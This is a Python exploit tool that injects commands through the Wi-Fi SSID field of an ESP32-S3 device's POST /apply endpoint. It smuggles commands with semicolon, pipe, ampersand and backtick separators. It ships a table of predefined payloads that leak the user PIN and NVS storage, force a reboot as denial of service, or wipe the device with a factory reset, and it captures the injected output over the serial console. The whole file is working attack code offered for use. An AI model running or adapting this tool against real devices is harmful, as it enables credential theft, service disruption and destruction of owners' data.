#!/usr/bin/env python3
"""
Command Injection Exploit Tool

Sends command injection payloads to the POST /apply endpoint of an ESP32-S3
device via the WiFi SSID field. The firmware constructs a shell command from
the unsanitized SSID, and metacharacters (;, |, &, backtick) break the
command boundary, causing injected text to be executed by the SerialShell
command parser.

Injected command output appears on the serial console (UART), not in the
HTTP response. Use --serial-port to capture serial output automatically.

Usage examples:

  # Inject 'status' command using semicolon separator
  ./cmd_inject.py --command status

  # Inject using pipe separator
  ./cmd_inject.py --command help --method pipe

  # Inject using ampersand separator
  ./cmd_inject.py --command "nvs-list" --method ampersand

  # Inject with serial monitoring to capture output
  ./cmd_inject.py --command status --serial-port /dev/ttyACM0

  # Use a predefined payload
  ./cmd_inject.py --payload nvs-list

  # List available predefined payloads
  ./cmd_inject.py --list-payloads

  # Send a raw SSID string (no auto-formatting)
  ./cmd_inject.py --raw-ssid "test;status;help"
"""

import argparse
import json
import os
import socket
import sys
import threading
import time
import urllib.request
import urllib.error
import urllib.parse


DEFAULT_TARGET = "http://192.168.4.1"
DEFAULT_SERIAL = "/dev/ttyACM0"
DEFAULT_BAUD = 115200

# Injection method separators
METHODS = {
    "semicolon": ";",
    "pipe": "|",
    "ampersand": "&",
    "backtick": "`",
}

# Predefined payloads targeting known SerialShell commands
PAYLOADS = {
    "status": {
        "command": "status",
        "description": "Dump device status including User PIN, device ID, WiFi config",
    },
    "nvs-list": {
        "command": "nvs-list",
        "description": "List NVS storage contents (user PIN, WiFi SSID)",
    },
    "nvs-dump": {
        "command": "nvs-dump",
        "description": "Full NVS dump (requires admin mode on device)",
    },
    "help": {
        "command": "help",
        "description": "Enumerate all available SerialShell commands",
    },
    "wifi": {
        "command": "wifi",
        "description": "Show WiFi status and configuration",
    },
    "reboot": {
        "command": "reboot",
        "description": "Force device reboot (denial of service)",
    },
    "self-test": {
        "command": "self-test",
        "description": "Trigger hardware self-test sequence",
    },
    "bus-diag": {
        "command": "bus-diag",
        "description": "Run I2C/SPI bus diagnostics",
    },
    "factory-reset": {
        "command": "factory-reset",
        "description": "DESTRUCTIVE - wipe all settings and reset device",
    },
}


def build_ssid(command, method="semicolon", prefix="test"):
    """Build a malicious SSID with the injected command."""
    separator = METHODS.get(method)
    if separator is None:
        print("[!] Unknown method '{}'. Use: {}".format(
            method, ", ".join(METHODS.keys())
        ))
        sys.exit(1)

    if method == "backtick":
        # Backtick wraps the command: prefix`command`
        ssid = "{}{}{}{}".format(prefix, separator, command, separator)
    else:
        # Other separators: prefix<sep>command
        ssid = "{}{}{}".format(prefix, separator, command)

    return ssid


def send_injection(target, ssid, password="x"):
    """Send the injection payload to POST /apply."""
    apply_url = "{}/apply".format(target.rstrip("/"))

    # URL-encode the form data
    payload = urllib.parse.urlencode({"ssid": ssid, "pass": password})

    print("[*] Target: {}".format(apply_url))
    print("[*] SSID payload: {}".format(ssid))
    print("[*] Constructed command on device:")
    print("    echo 'SSID: {}' > /tmp/wifi.conf".format(ssid))
    print()

    try:
        req = urllib.request.Request(
            apply_url,
            data=payload.encode("utf-8"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            method="POST",
        )
        resp = urllib.request.urlopen(req, timeout=10)
        body = resp.read().decode("utf-8", errors="replace")
        print("[+] HTTP response (status {}):".format(resp.status))
        for line in body.strip().splitlines():
            print("    {}".format(line))
        return True
    except urllib.error.URLError as e:
        print("[!] Failed to reach device: {}".format(e))
        return False
    except socket.timeout:
        print("[!] Request timed out.")
        return False
    except Exception as e:
        print("[!] Error: {}".format(e))
        return False


def monitor_serial(port, baud, duration=10, stop_event=None):
    """Monitor serial port for command output.

    Returns captured output as a string.
    """
    try:
        import serial
    except ImportError:
        print("[!] pyserial not installed. Install with: pip install pyserial")
        print("[*] Serial monitoring disabled. Check output manually with:")
        print("    pio device monitor -b {}".format(baud))
        return None

    captured = []
    try:
        ser = serial.Serial(port, baud, timeout=1)
        print("[*] Monitoring serial port {} at {} baud...".format(port, baud))
        print("[*] Capturing for {} seconds after injection...".format(duration))
        print()

        start = time.time()
        while time.time() - start < duration:
            if stop_event and stop_event.is_set():
                break
            if ser.in_waiting:
                line = ser.readline().decode("utf-8", errors="replace").rstrip()
                if line:
                    captured.append(line)
                    print("  [SERIAL] {}".format(line))
            else:
                time.sleep(0.05)

        ser.close()
    except serial.SerialException as e:
        print("[!] Serial error: {}".format(e))
        print("[*] Make sure no other program is using {}".format(port))
    except Exception as e:
        print("[!] Error monitoring serial: {}".format(e))

    return "\n".join(captured) if captured else None


def main():
    parser = argparse.ArgumentParser(
        description="Command injection via WiFi SSID field on ESP32-S3 device. "
        "Injects commands into the POST /apply endpoint by embedding "
        "shell metacharacters in the SSID parameter. Injected commands "
        "execute via the device SerialShell; output appears on UART.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""injection methods:
  semicolon   test;command      Most common command separator
  pipe        test|command      Pipe output to next command
  ampersand   test&command      Background execution / conditional
  backtick    test`command`     Command substitution

examples:
  # Leak device status and PIN
  %(prog)s --command status

  # Enumerate available commands
  %(prog)s --command help --method pipe

  # Dump NVS credentials with serial capture
  %(prog)s --payload nvs-list --serial-port /dev/ttyACM0

  # Custom raw SSID (bypass auto-formatting)
  %(prog)s --raw-ssid "x;status;help;nvs-list"

  # Send to a specific device
  %(prog)s --command status --target http://10.0.0.50

note:
  The device reboots ~2 seconds after each /apply request.
  Wait for it to come back before sending another injection.
  Injected command output is on the serial console, NOT in
  the HTTP response body.
""",
    )

    parser.add_argument(
        "--target",
        "-t",
        default=DEFAULT_TARGET,
        metavar="URL",
        help="Device URL (default: {})".format(DEFAULT_TARGET),
    )

    # Injection content (mutually exclusive)
    inject_group = parser.add_mutually_exclusive_group()
    inject_group.add_argument(
        "--command",
        "-c",
        metavar="CMD",
        help="SerialShell command to inject (e.g., status, help, nvs-list)",
    )
    inject_group.add_argument(
        "--payload",
        "-P",
        metavar="NAME",
        help="Use a predefined payload (see --list-payloads)",
    )
    inject_group.add_argument(
        "--raw-ssid",
        metavar="SSID",
        help="Send a raw SSID string (no auto-formatting with separator)",
    )
    inject_group.add_argument(
        "--list-payloads",
        action="store_true",
        help="List predefined payloads and exit",
    )

    parser.add_argument(
        "--method",
        "-m",
        default="semicolon",
        choices=list(METHODS.keys()),
        help="Injection separator method (default: semicolon)",
    )
    parser.add_argument(
        "--prefix",
        default="test",
        metavar="STR",
        help='SSID prefix before the separator (default: "test")',
    )
    parser.add_argument(
        "--password",
        default="x",
        metavar="STR",
        help='Password field value (default: "x")',
    )

    # Serial monitoring
    parser.add_argument(
        "--serial-port",
        "-s",
        metavar="PORT",
        help="Serial port to monitor for output (e.g., /dev/ttyACM0)",
    )
    parser.add_argument(
        "--baud",
        "-b",
        type=int,
        default=DEFAULT_BAUD,
        metavar="RATE",
        help="Serial baud rate (default: {})".format(DEFAULT_BAUD),
    )
    parser.add_argument(
        "--capture-time",
        type=int,
        default=8,
        metavar="SECS",
        help="Seconds to capture serial output after injection (default: 8)",
    )

    # Output
    parser.add_argument(
        "--output",
        "-o",
        metavar="FILE",
        help="Save captured serial output to file",
    )

    args = parser.parse_args()

    # List payloads
    if args.list_payloads:
        print("Predefined payloads:")
        print()
        print("  {:<16s}  {:<16s}  {}".format("Name", "Command", "Description"))
        print("  {:<16s}  {:<16s}  {}".format("-" * 16, "-" * 16, "-" * 40))
        for name, info in PAYLOADS.items():
            print(
                "  {:<16s}  {:<16s}  {}".format(
                    name, info["command"], info["description"]
                )
            )
        print()
        print("Use --payload <name> to send a predefined payload.")
        return

    # Determine SSID
    if args.raw_ssid:
        ssid = args.raw_ssid
    elif args.payload:
        if args.payload not in PAYLOADS:
            print("[!] Unknown payload '{}'. Use --list-payloads.".format(args.payload))
            sys.exit(1)
        cmd = PAYLOADS[args.payload]["command"]
        print("[*] Payload: {} - {}".format(
            args.payload, PAYLOADS[args.payload]["description"]
        ))
        ssid = build_ssid(cmd, args.method, args.prefix)
    elif args.command:
        ssid = build_ssid(args.command, args.method, args.prefix)
    else:
        parser.error("One of --command, --payload, --raw-ssid, or --list-payloads is required.")

    print()
    print("=" * 60)
    print("  COMMAND INJECTION via WiFi SSID")
    print("  Method: {} ({})".format(args.method, METHODS.get(args.method, "?")))
    print("  SSID:   {}".format(ssid))
    print("=" * 60)
    print()

    # Start serial monitoring in background if requested
    serial_output = None
    serial_thread = None
    stop_event = threading.Event()

    if args.serial_port:
        serial_thread = threading.Thread(
            target=lambda: monitor_serial(
                args.serial_port, args.baud, args.capture_time + 5, stop_event
            ),
            daemon=True,
        )
        serial_thread.start()
        # Give serial monitor a moment to connect
        time.sleep(1)

    # Send injection
    success = send_injection(args.target, ssid, args.password)

    if success and args.serial_port:
        print()
        print("[*] Waiting {} seconds to capture serial output...".format(
            args.capture_time
        ))
        time.sleep(args.capture_time)
        stop_event.set()
        if serial_thread:
            serial_thread.join(timeout=3)

    elif not success:
        print()
        print("[*] Injection request failed. Try these troubleshooting steps:")
        print("    1. Verify device is reachable: curl {}".format(args.target))
        print("    2. Check WiFi connection to device AP")
        print("    3. Device may be rebooting from a previous injection")

    # Save output if requested
    if args.output and serial_output:
        with open(args.output, "w") as f:
            f.write(serial_output)
        print("[*] Serial output saved to {}".format(args.output))

    print()
    print("[*] Note: the device will reboot ~2 seconds after /apply.")
    print("[*] Wait for it to come back before sending another injection.")
    if not args.serial_port:
        print("[*] Tip: use --serial-port /dev/ttyACM0 to capture command output,")
        print("    or monitor manually: pio device monitor -b 115200")


if __name__ == "__main__":
    main()
